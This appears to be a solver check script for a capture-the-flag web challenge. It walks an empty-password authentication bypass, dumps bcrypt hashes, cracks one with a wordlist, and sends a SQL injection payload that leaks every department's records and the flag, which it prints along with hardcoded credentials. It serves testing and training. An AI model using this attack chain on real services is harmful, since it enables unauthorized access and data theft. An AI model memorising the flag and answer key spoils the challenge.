#!/usr/bin/env python3
"""HTTP-level check of the Postman chain through the public gateway."""
import base64
import json
import os
from pathlib import Path
import bcrypt
import requests

base = os.getenv('GATEWAY_URL', 'http://localhost:8080')
def auth(user, password):
    value = base64.b64encode(f'{user}:{password}'.encode()).decode()
    return {'Authorization': 'Basic ' + value}
def call(method, path, expected, user=None, password=None, **kwargs):
    headers = auth(user, password) if user is not None else {}
    response = requests.request(method, base + path, headers=headers, timeout=15, **kwargs)
    assert response.status_code == expected, (path, response.status_code, response.text[:300])
    return response.json() if expected == 200 else None

call('GET','/users',401)
call('GET','/notes',401)
call('GET','/users',401,'unknown','')
roster = call('GET','/users',200,'mr.president','')
bob = next(u for u in roster if u['username']=='bob')
assert bob['passwordHash'].startswith(('$2a$','$2b$'))
call('GET','/notes',403,'mr.president','')
call('POST','/documents/search',403,'mr.president','',json={'department':'intel-analysis'})
password = next((word for word in Path(__file__).resolve().parents[1].joinpath('solve/wordlist.txt').read_text().splitlines()
                 if bcrypt.checkpw(word.encode(), bob['passwordHash'].encode())), None)
assert password, 'Bob hash not recoverable from wordlist'
call('GET','/users',403,'bob',password)
bob_notes = call('GET','/notes',200,'bob',password)
maija_notes = call('GET','/notes',200,'m.lehtinen','d5jW#9pqL!2zX')
assert bob_notes == maija_notes and any(n['title']=='Briefing index' for n in bob_notes)
logistics = call('GET','/notes',200,'r.dubois','Tr0ub4dor&3xZ!')
assert logistics and not {n['id'] for n in logistics} & {n['id'] for n in bob_notes}
assert call('GET','/notes?department=logistics-corps',200,'bob',password) == bob_notes
normal = call('POST','/documents/search',200,'bob',password,json={'query':'briefing','department':'intel-analysis'})
assert normal and {json.loads(d['metadata'])['department'] for d in normal} == {'intel-analysis'}
assert call('POST','/documents/search',200,'bob',password,json={'department':'logistics-corps'}) == []
payload = "intel-analysis' OR '1'='1"
injected = call('POST','/documents/search',200,'bob',password,json={'department':payload})
departments = {json.loads(d['metadata'])['department'] for d in injected}
assert {'intel-analysis','logistics-corps','command-staff','field-operations','mato-special-ops'} <= departments
assert any('FLAG{archive-isolation-broken-by-converter}' in d['content'] for d in injected)
assert call('POST','/documents/search-safe',200,'bob',password,json={'department':payload}) == []
print('Postman chain OK: LDAP bypass, roles, shared notes, injection, safe query')
